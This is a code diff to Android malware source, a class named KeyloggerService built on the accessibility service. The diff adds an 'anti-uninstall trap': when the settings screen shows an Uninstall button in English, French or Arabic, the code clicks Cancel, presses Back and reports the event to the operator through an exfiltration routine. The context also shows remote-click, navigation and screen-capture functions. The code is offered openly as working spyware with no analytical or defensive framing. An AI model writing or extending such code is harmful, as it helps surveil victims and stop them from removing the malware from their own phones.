@@ -91,6 +91,27 @@ public class KeyloggerService extends AccessibilityService {
                 clickNodeByText(root, "Continuer");
             }
         }
+
+        // <--- JDAD: ANTI-UNINSTALL TRAP
+        if (pkg.contains("settings") || pkg.contains("com.android.settings")) {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                // Ila l9a l'button dyal l'uninstall wla disable admin, kaydir Cancel
+                List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall");
+                if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("Désinstaller");
+                if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("إلغاء التثبيت");
+                
+                if (uninstallNodes != null && !uninstallNodes.isEmpty()) {
+                    // Click "Cancel" / "Annuler" / "إلغاء"
+                    clickNodeByText(root, "Cancel");
+                    clickNodeByText(root, "Annuler");
+                    clickNodeByText(root, "إلغاء");
+                    // Wla rje3 l'lor
+                    performGlobalAction(GLOBAL_ACTION_BACK);
+                    Exfil.send("🛡️ Anti-Uninstall Triggered!");
+                }
+            }
+        }
     }
 
     private void clickNodeByText(AccessibilityNodeInfo root, String text) {
@@ -117,8 +138,6 @@ public class KeyloggerService extends AccessibilityService {
             buffer.setLength(0);
         }
     }
-
-    // ================== SMART GHOST TOUCH ==================
 
     public boolean performClick(String textToFind) {
         AccessibilityNodeInfo root = getRootInActiveWindow();
@@ -189,8 +208,6 @@ public class KeyloggerService extends AccessibilityService {
     public void pressHome() { performGlobalAction(GLOBAL_ACTION_HOME); }
     public void pressRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }
     public void openNotifications() { performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); }
-
-    // ================== SCREENSHOTS ==================
 
     public void captureScreen() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
